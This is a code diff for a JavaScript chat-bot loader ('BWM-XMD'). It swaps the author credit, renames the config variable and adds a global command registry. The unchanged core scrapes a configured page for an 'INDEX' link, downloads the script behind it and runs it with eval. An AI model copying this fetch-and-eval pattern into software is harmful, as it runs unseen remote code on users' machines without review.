@@ -2,16 +2,41 @@
 //  [BWM-XMD QUANTUM EDITION]                                           
 //  >> A superposition of elegant code states                           
 //  >> Collapsed into optimal execution                                
-//  >> Scripted by Sir Ibrahim Adams                                    
+//  >> Scripted by Sir Aslam Dullah                                    
 //  >> Version: 8.3.5-quantum.7
 
 const axios = require('axios');
 const cheerio = require('cheerio');
-const adams = require("./config");
+const dullaConfig = require("./config");
+
+// Global command registry for the bot framework
+global.commands = global.commands || [];
+
+// Create global dullah function for command registration (Zokou-style framework)
+global.dullah = function(options, handler) {
+  if (typeof options === 'object' && typeof handler === 'function') {
+    global.commands.push({ options, handler });
+    return true;
+  }
+  return dullaConfig;
+};
+
+// Also expose config properties on global.dullah
+Object.keys(dullaConfig).forEach(key => {
+  if (typeof dullaConfig[key] !== 'function') {
+    Object.defineProperty(global.dullah, key, {
+      get: function() { return dullaConfig[key]; },
+      enumerable: true
+    });
+  }
+});
+
+// Local reference
+const dullah = global.dullah;
 
 async function fetchINDEXUrl() {
   try {
-    const response = await axios.get(adams.BWM_XMD);
+    const response = await axios.get(dullaConfig.BWM_XMD);
     const $ = cheerio.load(response.data);
 
     const targetElement = $('a:contains("INDEX")');
@@ -24,6 +49,7 @@ async function fetchINDEXUrl() {
     console.log('The heart is loaded successfully ✅');
 
     const scriptResponse = await axios.get(targetUrl);
+    const dullah = global.dullah;
     eval(scriptResponse.data);
 
   } catch (error) {
